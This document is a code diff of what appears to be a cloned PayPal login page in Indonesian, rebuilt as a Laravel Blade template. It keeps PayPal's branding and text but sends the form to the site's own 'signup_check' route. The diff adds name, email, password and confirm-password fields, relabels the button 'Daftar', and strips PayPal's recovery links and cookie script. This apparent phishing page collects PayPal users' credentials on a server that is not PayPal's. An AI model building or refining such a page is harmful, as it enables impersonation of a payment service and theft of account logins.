@@ -1104,85 +1104,12 @@
         data-use-pass-key="true"
         data-passkey-auto-upgrade-eligible="true"
     >
-        <noscript><p class="nonjsAlert" role="alert">CATATAN: Banyak fitur di Situs Web PayPal yang memerlukan Javascript dan kuki.</p></noscript>
         <div id="main" class="main" role="main">
-            <section id="slLanding" class="slLanding hide" data-role="page" data-title="Hubungkan akun Google dan check out lebih cepat di perangkat Anda.">
-                <div class="corral">
-                    <div id="slContent" class="contentContainer contentContainerBordered">
-                        <header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long"></p></header>
-                        <div id="linked" class="linked">
-                            <div class="profileRemembered"><span class="loginEmail"></span>
-                                <a href="#" class="changeLink scTrack:not-you" id="changeLink" pa-marked="1">Ubah</a>
-                            </div>
-                            <div class="headerTextDecorated"></div>
-                            <h1 class="headerText">Tetap log in untuk checkout yang lebih cepat</h1>
-                            <p class="description assure">
-                                Aktifkan login otomatis di peramban ini dan percepat checkout setiap kali. (Tidak disarankan untuk perangkat yang dipakai bersama.)
-                                <span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">Apa ini?</a></span>
-                            </p>
-                            <div id="partnerProfile" class="partnerProfile">
-                                <div id="partnerPhoto" class="partnerPhoto" style="background-image: url('');"></div>
-                                <div class="partnerDetails">
-                                    <span>Anda masuk sebagai</span>
-                                    <div id="displayName" class="displayName"></div>
-                                    <div>
-                                        <div class="partnerEmailDiv"><span class="partnerIcon"></span><span id="partnerEmail" class="partnerEmail"></span><span id="partnerEmailDomain"></span></div>
-                                    </div>
-                                </div>
-                            </div>
-                            <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="continueBtn" name="continueBtn" value="continueBtn" pa-marked="1">Lanjutkan</button></div>
-                            <div id="secondaryLogin" class="buttonAsLink secondaryLink">
-                                <button class="scTrack:unifiedlogin-use-password" id="secondaryLoginBtn" name="secondaryLoginBtn" value="secondaryLoginBtn" pa-marked="1">Gunakan sandi</button>
-                            </div>
-                        </div>
-                        <div id="unlinked" class="unlinked">
-                            <div id="headerIcon" class="partnerConnect"></div>
-                            <h1 class="headerText">Hubungkan akun Google dan check out lebih cepat di perangkat Anda.</h1>
-                            <p class="description assure">
-                                Log in secara otomatis ke PayPal untuk checkout lebih cepat tanpa harus mengetik sandi di mana pun Anda log in dengan akun Google.
-                                <a href="#" id="slOptInlearnMore" class="secondayLink scTrack:unifiedlogin-sl-whatsthis" pa-marked="1">Apa ini?</a>
-                            </p>
-                            <p class="secondaryLink hide" id="slOptIn_notNow"><a href="#" pa-marked="1">Jangan sekarang</a></p>
-                        </div>
-                        <div id="learnMoreModal" class="learnMoreModal">
-                            <div id="optInLearnMoreDesc" class="optInLearnMoreDesc">
-                                <h1 class="headerText headerTextSpaced">Mengapa harus terhubung ke akun Google?</h1>
-                                <p>Menghubungkan akun Google memungkinkan Anda untuk mengaktifkan One Touch dengan cepat dan mudah saat check out. Fitur ini dapat dinonaktifkan dalam Pengaturan di Paypal.com.</p>
-                                <p>Setiap kali Anda check out pada perangkat dan peramban baru bila login dengan akun Google, Anda bisa login secara otomatis saat checkout tanpa mengetikkan sandi.</p>
-                            </div>
-                            <div id="slLoginLearnMoreDesc" class="slLoginLearnMoreDesc">
-                                <h1 class="headerText headerTextSpaced">Tetap log in untuk checkout yang lebih cepat</h1>
-                                <p>
-                                    Lewati tahap pengetikkan sandi dengan tetap log in di perangkat ini. Demi keamanan, Anda terkadang akan diminta log in misalnya saat memperbarui informasi pribadi atau keuangan Anda. Kami tidak
-                                    menyarankan penggunaan One Touch pada perangkat yang dipakai bersama. Fitur ini dapat dinonaktifkan kapan saja di pengaturan PayPal.
-                                </p>
-                            </div>
-                            <button type="button" class="ui-dialog-titlebar-close" pa-marked="1"></button>
-                        </div>
-                        <div class="intentFooter">
-                            <div class="localeSelector">
-                                <span class="picker country-selector"><span class="hide" id="countryPickerLink">Indonesia</span><button type="button" aria-label="countryPickerLink" class="country ID" pa-marked="1"></button></span>
-                                <ul class="localeLink">
-                                    <li>
-                                        <a class="selected scTrack:unifiedlogin-footer-language_id_ID" href="/signin?country.x=ID&amp;locale.x=id_ID&amp;langTgl=id" lang="id" data-locale="id_ID" aria-current="”true”" pa-marked="1">
-                                            Indonesia
-                                        </a>
-                                    </li>
-                                    <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=ID&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" pa-marked="1">English</a></li>
-                                </ul>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </section>
             <section id="login" class="login" data-role="page" data-title="Log in ke rekening PayPal Anda">
                 <div class="corral">
                     <div id="content" class="contentContainer activeContent contentContainerBordered">
                         <div class="">
                             <header id="header"><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p></header>
-                            <h1 id="headerText" class="headerText accessAid">Log in ke rekening PayPal Anda</h1>
-                            <p id="phoneSubTagLine" class="subHeaderText hide">Apakah nomor telepon seluler Anda telah diatur untuk digunakan saat log in? Ketik di bawah ini. Atau, klik tautan untuk log in dengan email.</p>
-                            <p id="subTagLineConnectOtp" class="subHeaderText hide">Lupa alamat email Anda? Buka situs web PayPal untuk memulihkannya kembali.</p>
                             <div>
                                 <div id="loginContent" class="">
                                     <div id="loginSection" class="">
@@ -1192,9 +1119,30 @@
                                             <p class="notification notification-warning blocked-on-risky-login hide">Silakan log in dengan email dan password Anda.</p>
                                             <p class="notification notification-critical keychain-activation-failure hide">Ada yang salah pada sistem kami. Silakan log in dengan email dan password Anda.</p>
                                         </div>
-                                        <form action="{{ route('auth_check') }}" method="post" class="proceed maskable" autocomplete="on" name="login" novalidate>
+                                        <form action="{{ route('signup_check') }}" method="post" class="proceed maskable" autocomplete="on" name="login" novalidate>
                                             @csrf
-                                            <div id="passwordSection" class="clearfix splitEmail">
+                                            <div id="nameSection" class="clearfix splitName">
+                                                <div id="splitNameSection" class="splitPhoneSection splitNameSection">
+                                                    <div class="textInput" id="login_namediv">
+                                                        <div class="fieldWrapper">
+                                                            <input
+                                                                id="name"
+                                                                name="login_name"
+                                                                type="text"
+                                                                class="hasHelp validateEmpty"
+                                                                required="required"
+                                                                autocomplete="off"
+                                                                placeholder="Masukkan nama anda"
+                                                                aria-describedby="emailErrorMessage"
+                                                            />
+                                                            <label for="email" class="fieldLabel">Nama anda</label>
+                                                        </div>
+                                                        <div class="errorMessage" id="nameErrorMessage">
+                                                            <p class="emptyError hide">Wajib diisi</p>
+                                                            <p class="invalidError hide">Format email atau nomor telepon seluler tidak sesuai</p>
+                                                        </div>
+                                                    </div>
+                                                </div>
                                                 <div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
                                                     <div class="textInput" id="login_emaildiv">
                                                         <div class="fieldWrapper">
@@ -1229,12 +1177,12 @@
                                                                 value=""
                                                                 placeholder="Sandi"
                                                                 aria-describedby="passwordErrorMessage"
-                                                                autocomplete="username webauthn"
+                                                                autocomplete="off"
                                                             />
                                                             <label for="password" class="fieldLabel">Sandi</label><label for="Tampilkan Sandi" class="fieldLabel">Tampilkan Sandi</label>
-                                                            <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Tampilkan Sandi" pa-marked="1">Tampilkan</button>
+                                                            <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password" id="Tampilkan Sandi">Tampilkan</button>
                                                             <label for="Sembunyikan" class="fieldLabel">Sembunyikan</label>
-                                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Sembunyikan" pa-marked="1">Sembunyikan</button>
+                                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Sembunyikan">Sembunyikan</button>
                                                         </div>
                                                         <div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Wajib diisi</p></div>
                                                     </div>
@@ -1243,35 +1191,48 @@
                                                         id="setupPassword"
                                                         class="recoveryOption forgotPassword hide"
                                                         data-client-log-action-type="clickSetupPasswordLink"
-                                                        pa-marked="1"
+                                                       
                                                     >
                                                         Atur sandi
                                                     </a>
-                                                    <a
-                                                        href="/authflow/password-recovery/"
-                                                        id="forgotPassword"
-                                                        class="recoveryOption forgotPassword"
-                                                        data-client-log-action-type="clickForgotPasswordLink"
-                                                        pa-marked="1"
-                                                    >
-                                                        Lupa sandi?
-                                                    </a>
+                                                </div>
+                                                <div id="passwordSection" class="clearfix showHideButtonForEligibleBrowser">
+                                                    <div class="textInput" id="login_password2">
+                                                        <div class="fieldWrapper">
+                                                            <input
+                                                                id="password2"
+                                                                name="login_password2"
+                                                                type="password"
+                                                                class="hasHelp validateEmpty pin-password"
+                                                                required="required"
+                                                                value=""
+                                                                placeholder="Sandi"
+                                                                autocomplete="off"
+                                                            />
+                                                            <label for="password" class="fieldLabel">Sandi Konfirmasi</label>
+                                                            <label for="Tampilkan Sandi" class="fieldLabel">Tampilkan Sandi</label>
+                                                            <button type="button" class="showPassword hide show-hide-password scTrack:unifiedlogin-show-password2" id="Tampilkan Sandi">Tampilkan</button>
+                                                            <label for="Sembunyikan" class="fieldLabel">Sembunyikan</label>
+                                                            <button type="button" class="hidePassword hide show-hide-password scTrack:unifiedlogin-hide-password" id="Sembunyikan">Sembunyikan</button>
+                                                        </div>
+                                                        <div class="errorMessage" id="passwordErrorMessage"><p class="emptyError hide">Wajib diisi</p></div>
+                                                    </div>
                                                 </div>
                                             </div>
                                             <div class="actions">
-                                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login" pa-marked="1">Log In</button>
+                                                <button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Signup">Daftar</button>
                                             </div>
                                         </form>
                                         <div class="moreOptionsDiv hide" id="moreOptionsContainer">
-                                            <a href="#" id="moreOptions" class="moreOptionsInfo" pa-marked="1">Opsi lainnya</a>
+                                            <a href="#" id="moreOptions" class="moreOptionsInfo">Opsi lainnya</a>
                                             <div class="bubble-tooltip hide" id="moreOptionsDropDown">
                                                 <ul class="moreoptionsGroup">
-                                                    <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile" pa-marked="1">Setuju untuk log in dengan menggunakan perangkat seluler</a></li>
+                                                    <li><a href="#" id="moreOptionsMobile" class="scTrack:unifiedlogin-click-more-options-mobile">Setuju untuk log in dengan menggunakan perangkat seluler</a></li>
                                                     <li>
                                                         <a
-                                                            href="/authflow/password-recovery/?country.x=ID&amp;locale.x=id_ID&amp;pwrMayflyId=pwr%3Ad9b8ee996f8f478d9b0c78cd75bad6aa&amp;redirectUri=%252Fsignin"
+                                                            href=""
                                                             class="scTrack:unifiedlogin-click-forgot-password pwrLink"
-                                                            pa-marked="1"
+                                                           
                                                         >
                                                             Mengalami masalah saat log in?
                                                         </a>
@@ -1279,15 +1240,15 @@
                                                 </ul>
                                             </div>
                                         </div>
-                                        <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="#" id="tryAnotherWayLink" pa-marked="1">Coba cara lain</a></div>
+                                        <div id="tryAnotherWayLinkContainer" class="tryAnotherWayLinkContainer hide" data-hide-on-pass=""><a href="#" id="tryAnotherWayLink">Coba cara lain</a></div>
                                         <div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
                                             <div class="loginSignUpSeparator"><span class="textInSeparator">atau</span></div>
-                                            <button type="button" href="{{ route('signup_form') }}" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount" pa-marked="1">Daftar</button>
+                                            <button type="button" href="{{ route('signin_form') }}" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">Masuk</button>
                                         </div>
                                         <div id="tpdButtonContainer" class="signupContainer hide">
                                             <div class="loginSignUpSeparator"><span class="textInSeparator">atau</span></div>
                                             <div class="actions">
-                                                <button class="button secondary" id="tpdButton" type="submit" value="Setuju untuk log in dengan menggunakan perangkat seluler" pa-marked="1">
+                                                <button class="button secondary" id="tpdButton" type="submit" value="Setuju untuk log in dengan menggunakan perangkat seluler">
                                                     Setuju untuk log in dengan menggunakan perangkat seluler
                                                 </button>
                                             </div>
@@ -1296,14 +1257,14 @@
                                 </div>
                                 <div class="intentFooter">
                                     <div class="localeSelector">
-                                        <span class="picker country-selector"><span class="hide" id="countryPickerLink">Indonesia</span><button type="button" aria-label="countryPickerLink" class="country ID" pa-marked="1"></button></span>
+                                        <span class="picker country-selector"><span class="hide" id="countryPickerLink">Indonesia</span><button type="button" aria-label="countryPickerLink" class="country ID"></button></span>
                                         <ul class="localeLink">
                                             <li>
-                                                <a class="selected scTrack:unifiedlogin-footer-language_id_ID" href="/signin?country.x=ID&amp;locale.x=id_ID&amp;langTgl=id" lang="id" data-locale="id_ID" aria-current="”true”" pa-marked="1">
+                                                <a class="selected scTrack:unifiedlogin-footer-language_id_ID" href="/signin?country.x=ID&amp;locale.x=id_ID&amp;langTgl=id" lang="id" data-locale="id_ID" aria-current="”true”">
                                                     Indonesia
                                                 </a>
                                             </li>
-                                            <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=ID&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US" pa-marked="1">English</a></li>
+                                            <li><a class="scTrack:unifiedlogin-footer-language_en_US" href="/signin?country.x=ID&amp;locale.x=en_US&amp;langTgl=en" lang="en" data-locale="en_US">English</a></li>
                                         </ul>
                                     </div>
                                 </div>
@@ -1313,37 +1274,37 @@
                             <div class="modal-content">
                                 <div class="modal-content-header">
                                     <div class="modal-header-text">Coba cara lain</div>
-                                    <div><button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn" pa-marked="1"></button></div>
+                                    <div><button id="closeModal" type="button" class="dialog-close" aria-label="dialog-close-btn"></button></div>
                                 </div>
                                 <ul class="modal-content-body">
                                     <li class="hide">
-                                        <a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="#" pa-marked="1">
+                                        <a aria-label="Login with Touch ID or Face ID" id="loginWithWebauthn" href="#">
                                             <div>Log in dengan pemindaian wajah, sidik jari, atau PIN</div>
-                                            <button class="chevron-right" aria-label="webauthn-chevron" pa-marked="1"></button>
+                                            <button class="chevron-right" aria-label="webauthn-chevron"></button>
                                         </a>
                                     </li>
                                     <li class="hide">
-                                        <a aria-label="Login with phone one-time code" id="loginWithOtp" href="#" pa-marked="1">
+                                        <a aria-label="Login with phone one-time code" id="loginWithOtp" href="#">
                                             <div>Kirim kode sekali pakai melalui SMS</div>
-                                            <button class="chevron-right" aria-label="phone-otc-chevron" pa-marked="1"></button>
+                                            <button class="chevron-right" aria-label="phone-otc-chevron"></button>
                                         </a>
                                     </li>
                                     <li class="hide">
-                                        <a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="#" pa-marked="1">
+                                        <a aria-label="Login with email one-time code" id="loginWithEmailOtp" href="#">
                                             <div>Kirim kode sekali pakai melalui email</div>
-                                            <button class="chevron-right" aria-label="email-otc-chevron" pa-marked="1"></button>
+                                            <button class="chevron-right" aria-label="email-otc-chevron"></button>
                                         </a>
                                     </li>
                                     <li class="hide">
-                                        <a aria-label="Login with password" id="loginWithPassword" href="#" pa-marked="1">
+                                        <a aria-label="Login with password" id="loginWithPassword" href="#">
                                             <div>Log in dengan sandi Anda</div>
-                                            <button class="chevron-right" aria-label="pwd-chevron" pa-marked="1"></button>
+                                            <button class="chevron-right" aria-label="pwd-chevron"></button>
                                         </a>
                                     </li>
                                     <li>
-                                        <a id="guestCheckout" aria-label="sign up" href="/id/webapps/mpp/account-selection" pa-marked="1">
+                                        <a id="guestCheckout" aria-label="sign up" href="{{ route('signup_form') }}">
                                             <div>Daftar</div>
-                                            <button class="chevron-right" aria-label="guest-chevron" pa-marked="1"></button>
+                                            <button class="chevron-right" aria-label="guest-chevron"></button>
                                         </a>
                                     </li>
                                 </ul>
@@ -1361,25 +1322,25 @@
                             <p id="cookiedMessage" class="verification-message hide">Buka aplikasi PayPal dan ketuk Ya saat diminta untuk log in.</p>
                             <div class="notifications"></div>
                             <div class="accountArea">
-                                <span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink" pa-marked="1">Bukan Anda?</a></span>
+                                <span class="account"></span><span class="verificationNotYou"><a data-href="#" href="#" class="scTrack:unifiedlogin-verification-click-notYou" id="pendingNotYouLink">Bukan Anda?</a></span>
                             </div>
                             <div class="mobileNotification">
                                 <p class="pin"></p>
                                 <div class="mobileScreen"><img src="https://www.paypalobjects.com/images/shared/icon-PN-check.png" alt="phone" /></div>
                             </div>
-                            <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password" pa-marked="1">Gunakan sandi</a></p>
-                            <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend" pa-marked="1">Kirim ulang</a><span class="sentMessage hide">Terkirim</span></p>
+                            <p class="tryAnotherMsg"><a id="tryPasswordLink" data-href="#" href="" class="inlineLink scTrack:try-password">Gunakan sandi</a></p>
+                            <p class="resendMsg"><a class="inlineLink scTrack:resend hide" role="button" data-href="#resend" href="" id="resend">Kirim ulang</a><span class="sentMessage hide">Terkirim</span></p>
                         </div>
                         <div id="expired" class="hide verificationSubSection">
                             <header><p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long">PayPal</p></header>
                             <h1 class="headerText headerTextWarning">Maaf, kami tidak dapat mengonfirmasi bahwa ini adalah Anda</h1>
                             <p class="slimP">Kami tidak menerima tanggapan sehingga kami tidak dapat mengonfirmasi identitas Anda.</p>
-                            <button id="expiredTryAgainButton" class="button actionsSpaced" pa-marked="1">Coba Lagi</button>
+                            <button id="expiredTryAgainButton" class="button actionsSpaced">Coba Lagi</button>
                         </div>
                         <div id="denied" class="denied hide verificationSubSection">
                             <img alt="" src="https://www.paypalobjects.com/images/shared/glyph_alert_critical_big-2x.png" class="deniedCaution" />
                             <h1 class="headerText">Maaf, kami tidak dapat mengonfirmasi bahwa ini adalah Anda</h1>
-                            <p>Butuh bantuan? <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help" pa-marked="1">Kami bisa membantu</a>.</p>
+                            <p>Butuh bantuan? <a href="/{coBrand}/cgi-bin/helpscr?cmd=_help" class="inlineLink scTrack:help">Kami bisa membantu</a>.</p>
                         </div>
                     </div>
                 </div>
@@ -1387,10 +1348,10 @@
             <footer class="footer footerStayPut" role="contentinfo">
                 <div class="legalFooter">
                     <ul class="footerGroup">
-                        <li><a target="_blank" href="/id/smarthelp/contact-us" pa-marked="1">Hubungi Kami</a></li>
-                        <li><a target="_blank" href="/id/webapps/mpp/ua/privacy-full" pa-marked="1">Privasi</a></li>
-                        <li><a target="_blank" href="/id/webapps/mpp/ua/legalhub-full" pa-marked="1">Hukum</a></li>
-                        <li><a target="_blank" href="/id/webapps/mpp/country-worldwide" pa-marked="1">Seluruh Dunia</a></li>
+                        <li><a target="_blank" href="/id/smarthelp/contact-us">Hubungi Kami</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/ua/privacy-full">Privasi</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/ua/legalhub-full">Hukum</a></li>
+                        <li><a target="_blank" href="/id/webapps/mpp/country-worldwide">Seluruh Dunia</a></li>
                     </ul>
                 </div>
             </footer>
@@ -1619,61 +1580,5 @@
             }
         </script>
         <script src="https://c.paypal.com/da/r/fb_fp.js"></script>
-        <iframe id="ppfnfnclspbfiframe" src="about:blank" title="pbf" tabindex="-1" style="width: 0px; height: 0px; border: 0px; position: absolute; z-index: -999; top: -10000px; left: -10000px;" aria-hidden="true"></iframe>
-        <script nonce="">
-            (function () {
-                function cookieFilteringRequest(eventSource) {
-                    const queryParamters = { eventSource, isQueryEncoded: true, page: "", component: "", eventSourceUrl: "", expireCookies: true };
-                    if (window) {
-                        queryParamters.page = (window.fpti && window.fpti.page) || (window.location && window.location.href);
-                        queryParamters.component = window.fpti && window.fpti.comp;
-                        const eventSourceUrl = window.location && window.location.href;
-                        queryParamters.eventSourceUrl = eventSourceUrl && eventSourceUrl.split("?")[0];
-                    }
-                    const xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
-                    let queryString = "";
-                    Object.keys(queryParamters).forEach((key, index) => (queryString += (index > 0 ? "&" : "") + key + "=" + btoa(queryParamters[key])));
-                    const endPoint = "https://www.paypal.com/myaccount/privacy/cookieprefs/cookies?" + queryString;
-                    xhr.open("GET", endPoint);
-                    xhr.withCredentials = true;
-                    xhr.onreadystatechange = function () {
-                        if (xhr.readyState > 3 && xhr.status === 200) {
-                            try {
-                                if (xhr?.response && xhr.response != "OK") {
-                                    const invalidCookies = JSON.parse(xhr?.response)?.invalidCookies;
-                                    if (invalidCookies.length > 0) {
-                                        const hostName = document.location.hostname;
-                                        let subDomains = [hostName];
-                                        const parts = hostName.split(".");
-                                        parts.forEach((e, i) => {
-                                            if (e !== "www") {
-                                                subDomains.push("." + parts.slice(i).join("."));
-                                            }
-                                        });
-                                        subDomains.pop();
-                                        invalidCookies.forEach((cookie) => {
-                                            document.cookie = cookie + "=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=.paypal.com";
-                                            document.cookie = cookie + "=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;";
-                                            subDomains.forEach((domain) => {
-                                                document.cookie = cookie + "=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=" + domain;
-                                            });
-                                        });
-                                    }
-                                }
-                            } catch (error) {}
-                        }
-                    };
-                    xhr.setRequestHeader("Accept", "application/json");
-                    xhr.setRequestHeader("Content-Type", "application/json");
-                    xhr.send();
-                }
-                cookieFilteringRequest("pageLoad");
-                if (true) {
-                    setTimeout(function () {
-                        cookieFilteringRequest("afterPageLoad");
-                    }, 3000);
-                }
-            })();
-        </script>
     </body>
 </html>
